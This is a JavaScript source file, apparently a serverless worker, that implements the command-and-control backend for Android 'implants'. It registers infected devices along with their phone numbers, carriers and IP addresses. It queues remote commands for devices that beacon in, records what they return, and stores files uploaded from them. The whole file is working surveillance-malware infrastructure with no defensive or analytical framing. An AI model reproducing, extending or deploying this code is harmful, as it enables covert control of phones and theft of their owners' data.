import { uuid, now, randomKey, json } from '../core/util.js';
import { implantAuth } from '../core/auth.js';

export async function handleRegister(req, env) {
  const body = await req.json();
  const { install_id, model, brand, android, sdk, carrier, phone } = body;
  if (!install_id) return json({ error: 'install_id required' }, 400);

  const ip = req.headers.get('CF-Connecting-IP') || '';
  const country = (req.cf && req.cf.country) || '??';

  let device = await env.DB.prepare(
    'SELECT id, api_key FROM devices WHERE install_id = ?'
  ).bind(install_id).first();

  if (!device) {
    const id = uuid();
    const api_key = randomKey(24);
    await env.DB.prepare(
      `INSERT INTO devices
       (id, install_id, model, brand, android, sdk, carrier, phone,
        ip, country, api_key, first_seen, last_seen, status)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'active')`
    ).bind(id, install_id, model || '?', brand || '?', android || '?',
            sdk || 0, carrier || '?', phone || '?', ip, country,
            api_key, now(), now()).run();
    device = { id, api_key };
  } else {
    await env.DB.prepare(
      'UPDATE devices SET last_seen = ?, ip = ?, model = COALESCE(?, model), phone = COALESCE(?, phone) WHERE id = ?'
    ).bind(now(), ip, model || null, phone || null, device.id).run();
  }

  return json({
    device_id: device.id,
    api_key: device.api_key,
    beacon_interval: 45,
    ts: now()
  });
}

export async function handleBeacon(req, env) {
  const api_key = await implantAuth(req);
  if (!api_key) return json({ error: 'unauthorized' }, 401);

  const body = await req.json().catch(() => ({}));
  const { battery } = body;

  const device = await env.DB.prepare(
    'SELECT id FROM devices WHERE api_key = ?'
  ).bind(api_key).first();
  if (!device) return json({ error: 'invalid key' }, 401);

  await env.DB.prepare(
    'UPDATE devices SET last_seen = ?, battery = ? WHERE id = ?'
  ).bind(now(), battery || 0, device.id).run();

  const { results: cmds } = await env.DB.prepare(
    `SELECT id, cmd, args FROM commands
     WHERE device_id = ? AND status = 'pending'
     ORDER BY created ASC LIMIT 10`
  ).bind(device.id).all();

  if (cmds.length) {
    const ids = cmds.map(c => c.id);
    const ph = ids.map(() => '?').join(',');
    await env.DB.prepare(
      `UPDATE commands SET status = 'sent', sent = ? WHERE id IN (${ph})`
    ).bind(now(), ...ids).run();
  }

  const parsed = cmds.map(c => ({
    id: c.id,
    cmd: c.cmd,
    args: c.args ? JSON.parse(c.args) : {}
  }));

  return json({ ts: now(), commands: parsed });
}

export async function handleResult(req, env) {
  const api_key = await implantAuth(req);
  if (!api_key) return json({ error: 'unauthorized' }, 401);

  const body = await req.json();
  const { command_id, data, error } = body;

  const device = await env.DB.prepare(
    'SELECT id FROM devices WHERE api_key = ?'
  ).bind(api_key).first();
  if (!device) return json({ error: 'invalid key' }, 401);

  const result_id = uuid();
  await env.DB.prepare(
    'INSERT INTO results (id, command_id, device_id, data, created) VALUES (?, ?, ?, ?, ?)'
  ).bind(result_id, command_id, device.id,
          JSON.stringify({ data: data || null, error: error || null }), now()).run();

  if (command_id) {
    await env.DB.prepare(
      "UPDATE commands SET status = 'done', done = ? WHERE id = ?"
    ).bind(now(), command_id).run();
  }

  const stub = env.DEVICE.get(env.DEVICE.idFromName(device.id));
  stub.fetch('https://do/notify', {
    method: 'POST',
    body: JSON.stringify({ type: 'result', command_id, result_id })
  }).catch(() => {});

  return json({ ok: true, result_id });
}

export async function handleUpload(req, env) {
  const api_key = await implantAuth(req);
  if (!api_key) return json({ error: 'unauthorized' }, 401);

  const device = await env.DB.prepare(
    'SELECT id FROM devices WHERE api_key = ?'
  ).bind(api_key).first();
  if (!device) return json({ error: 'invalid key' }, 401);

  const form = await req.formData();
  const file = form.get('file');
  const command_id = form.get('command_id');
  const label = form.get('label') || 'file';
  if (!file) return json({ error: 'no file' }, 400);

  const key = `${device.id}/${now()}_${label}_${file.name}`;
  await env.R2.put(key, file.stream(), {
    httpMetadata: { contentType: file.type || 'application/octet-stream' }
  });

  const result_id = uuid();
  await env.DB.prepare(
    `INSERT INTO results (id, command_id, device_id, data, file_key, created)
     VALUES (?, ?, ?, ?, ?, ?)`
  ).bind(result_id, command_id || null, device.id,
          JSON.stringify({ file: file.name, size: file.size, label }), key, now()).run();

  if (command_id) {
    await env.DB.prepare(
      "UPDATE commands SET status = 'done', done = ? WHERE id = ?"
    ).bind(now(), command_id).run();
  }

  const stub = env.DEVICE.get(env.DEVICE.idFromName(device.id));
  stub.fetch('https://do/notify', {
    method: 'POST',
    body: JSON.stringify({ type: 'result', command_id, result_id, file: key })
  }).catch(() => {});

  return json({ ok: true, result_id, key });
}
